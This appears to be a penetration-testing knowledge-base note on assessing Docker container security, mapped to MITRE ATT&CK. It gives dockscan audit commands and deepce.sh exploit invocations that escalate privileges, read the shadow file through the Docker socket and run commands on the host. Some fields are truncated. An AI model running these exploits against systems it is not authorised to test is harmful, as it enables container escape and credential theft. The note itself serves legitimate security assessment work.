---
id: 10e5af62-1f5e-47e3-887e-0a396f3c4afa
name: Docker Security Assessment
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:16.870357+00:00'
updated_at: '2023-04-10T20:33:48.499038+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Discovery|TA0007 - Discovery]]'
- '[[Execution|TA0002 - Execution]]'
- '[[Impact|TA0040 - Impact]]'
- '[[Resource Development|TA0042 - Resource Development]]'
techniques:
- '[[Cloud Service Discovery|T1526 - Cloud Service Discovery]]'
- '[[Container Administration Command|T1609 - Container Administration Command]]'
- '[[Deploy Container|T1610 - Deploy Container]]'
- '[[Exploitation for Client Execution|T1203 - Exploitation for Client Execution]]'
- '[[Stage Capabilities|T1608 - Stage Capabilities]]'
- '[[System Shutdown/Reboot|T1529 - System Shutdown/Reboot]]'
tags:
- '[[Container - Docker Pentest]]'
- '[[Tools]]'
commands:
- '[[Execute deepce.sh]]'
- '[[Exploit DOCKER]]'
- '[[Exploit PRIVILEGED]]'
- '[[Exploit SOCK]]'
- '[[Generate HTML report using dockscan]]'
- '[[Scan Docker containers using dockscan]]'
---

# Docker Security Assessment

## Summary

The Docker Security Assessment is a procedure that allows security professionals to assess the security posture of Docker containers. This procedure involves using tools such as Docker Security Vulnerability Scanner and DeepCe Docker Enumeration and Exploitation to identify vulnerabilities and misc

## Description

# Description

The Docker Security Assessment is a procedure that allows security professionals to assess the security posture of Docker containers. This procedure involves using tools such as Docker Security Vulnerability Scanner and DeepCe Docker Enumeration and Exploitation to identify vulnerabilities and misconfigurations within Docker containers. The offensive use of this procedure is to identify weaknesses that could be exploited by an attacker to gain unauthorized access to the container or the host system. From a technical standpoint, this procedure involves scanning Docker containers for known vulnerabilities and misconfigurations, and attempting to exploit these weaknesses to gain unauthorized access. The business value of this procedure is to ensure that Docker containers are deployed in a secure manner, reducing the risk of a security breach that could result in data loss or system downtime.

 

## Requirements

1. Access to Docker containers

1. Docker Security Vulnerability Scanner

1. DeepCe Docker Enumeration and Exploitation

 

## Defense

1. Ensure that Docker containers are up-to-date with the latest security patches

1. Implement access controls to limit the exposure of Docker containers

1. Monitor Docker containers for suspicious activity

 

## Objectives

1. Identify vulnerabilities and misconfigurations within Docker containers

1. Assess the security posture of Docker containers

1. Ensure that Docker containers are deployed in a secure manner

 

# Instructions

1. This command can be used to scan for security vulnerabilities and audit Docker installations. The 'unix:///var/run/docker.sock' argument specifies the location of the Docker socket file. The '-r html -o myreport' arguments specify the format and output file for the report. The '-v tcp://example.com:5422' argument specifies the location of the vulnerability database.

 



**Code**: [[dockscan unix:///var/run/docker.sock
dockscan -r h]]



> The 'dockscan' command can be used to scan for security vulnerabilities and audit Docker installations. The 'unix:///var/run/docker.sock' argument specifies the location of the Docker socket file. The '-r html -o myreport' arguments specify the format and output file for the report. The '-v tcp://example.com:5422' argument specifies the location of the vulnerability database. This command can be used to identify any security vulnerabilities in Docker installations and take appropriate measures to patch them.



**Command** ([[Scan Docker containers using dockscan]]):

```bash
dockscan unix:///var/run/docker.sock
```





**Command** ([[Generate HTML report using dockscan]]):

```bash
dockscan -r html -o myreport -v tcp://example.com:5422
```



2. To use DeepCe, run the following commands:

 



**Code**: [[./deepce.sh 
./deepce.sh --no-enumeration --exploi]]



> 1. `./deepce.sh` - This command will enumerate the Docker environment and provide information about running containers. 
2. `./deepce.sh --no-enumeration --exploit PRIVILEGED --username deepce --password deepce` - This command will attempt to escalate privileges within the Docker container using the `PRIVILEGED` exploit. The `--username` and `--password` flags should be replaced with valid credentials.
3. `./deepce.sh --no-enumeration --exploit SOCK --shadow` - This command will attempt to exploit the `SOCK` vulnerability in the Docker container and read the shadow file.
4. `./deepce.sh --no-enumeration --exploit DOCKER --command "whoami>/tmp/hacked"` - This command will exploit the `DOCKER` vulnerability in the Docker container and write the output of the `whoami` command to a file named `hacked` in the `/tmp` directory.



**Command** ([[Execute deepce.sh]]):

```bash
./deepce.sh
```





**Command** ([[Exploit PRIVILEGED]]):

```bash
./deepce.sh --no-enumeration --exploit PRIVILEGED --username deepce --password deepce
```





**Command** ([[Exploit SOCK]]):

```bash
./deepce.sh --no-enumeration --exploit SOCK --shadow
```





**Command** ([[Exploit DOCKER]]):

```bash
./deepce.sh --no-enumeration --exploit DOCKER --command "whoami>/tmp/hacked"
```



## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Discovery|TA0007 - Discovery]]
- [[Execution|TA0002 - Execution]]
- [[Impact|TA0040 - Impact]]
- [[Resource Development|TA0042 - Resource Development]]

### Techniques

- [[Cloud Service Discovery|T1526 - Cloud Service Discovery]]
- [[Container Administration Command|T1609 - Container Administration Command]]
- [[Deploy Container|T1610 - Deploy Container]]
- [[Exploitation for Client Execution|T1203 - Exploitation for Client Execution]]
- [[Stage Capabilities|T1608 - Stage Capabilities]]
- [[System Shutdown/Reboot|T1529 - System Shutdown/Reboot]]

## Commands Used

- [[Execute deepce.sh]]
- [[Exploit DOCKER]]
- [[Exploit PRIVILEGED]]
- [[Exploit SOCK]]
- [[Generate HTML report using dockscan]]
- [[Scan Docker containers using dockscan]]

## Tags

- [[Container - Docker Pentest]]
- [[Tools]]


